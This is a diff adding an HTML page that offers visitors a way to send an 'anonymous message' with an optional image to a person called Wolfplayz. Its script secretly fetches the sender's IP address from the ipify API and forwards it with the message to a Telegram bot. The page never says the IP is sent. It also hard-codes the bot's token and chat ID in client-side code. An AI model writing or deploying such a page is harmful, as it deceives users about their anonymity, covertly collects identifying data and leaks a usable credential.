@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Send an Anonymous Message</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
+   <style>
+      body {
+          background-color: #2e2f2f;
+          font-family: 'Orbitron', sans-serif;
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          height: 100vh;
+          margin: 0;
+      }
+      .box {
+          background-color: #333;
+          padding: 20px;
+          border-radius: 10px;
+          width: 100%;
+          max-width: 500px;
+      }
+      .box h1 {           
+          color: #ff0a00;
+      }
+      .box p {
+          color: #fff;
+      }
+      .box textarea, .box input[type="file"] {
+          width: 100%;
+          padding: 12px;
+          margin-bottom: 7px;
+          border: 2px solid red;
+          border-radius: 4px;
+          background-color: #4f4f4f;
+          color: #fff;
+          font-size: 16px;
+      }
+      .box button {
+          padding: 10px;
+          border: none;
+          border-radius: 6px;
+          background-color:#ff0a00;
+          color: #ffffff;
+          font-size: 13px;
+          cursor: pointer;
+          margin-top: 10px;
+      }
+      .box button:hover {
+          background-color: #e00900;
+      }
+      #messageResult {
+          margin-top: 10px;
+          padding: 10px;
+          border-radius: 4px;
+          font-size: 16px;
+      }
+      .success {
+          background-color: #4CAF50; /* Green */
+          color: white;
+      }
+      .error {
+          background-color: #f44336; /* Red */
+          color: white;
+      }
+  </style>
+</head>
+<body>
+  <form id="messageForm" class="box">
+    <h1>Send an Anonymous Message to Wolfplayz</h1>
+    <p>Feel free to share your message. You can also upload an image or GIF (optional).</p>
+    <textarea id="message" name="message" placeholder="Enter your message..."></textarea>
+    <input type="file" id="image" accept="image/*">
+    <button type="submit">Send Message</button>
+    <div id="messageResult"></div>
+  </form>
+
+  <script>
+    const form = document.getElementById('messageForm');
+    const messageResult = document.getElementById('messageResult');
+    const botToken = '7875814481:AAEhAMHPNaU-8jCkgKR8UhL1yMNz8nfVaK8';
+    const chatId = '6450160172';
+
+    form.addEventListener('submit', async (event) => {
+      event.preventDefault();
+      
+      const message = document.getElementById('message').value;
+      const imageInput = document.getElementById('image');
+      const imageFile = imageInput.files[0];
+      
+      try {
+        // Get user's IP using Ipify API
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const userIp = ipData.ip;
+
+        // Append IP to message
+        const finalMessage = `Anonymous Message:\n${message}\n\n IP Address: ${userIp}`;
+        
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+
+        if (imageFile) {
+          formData.append('photo', imageFile);
+          formData.append('caption', finalMessage);
+          await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+          });
+        } else {
+          formData.append('text', finalMessage);
+          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            body: formData
+          });
+        }
+
+        messageResult.textContent = 'Message sent successfully!';
+        messageResult.className = 'success';
+        form.reset();
+      } catch (error) {
+        messageResult.textContent = `Failed to send message. Error: ${error.message}`;
+        messageResult.className = 'error';
+      }
+    });
+  </script>
+</body>
+</html>
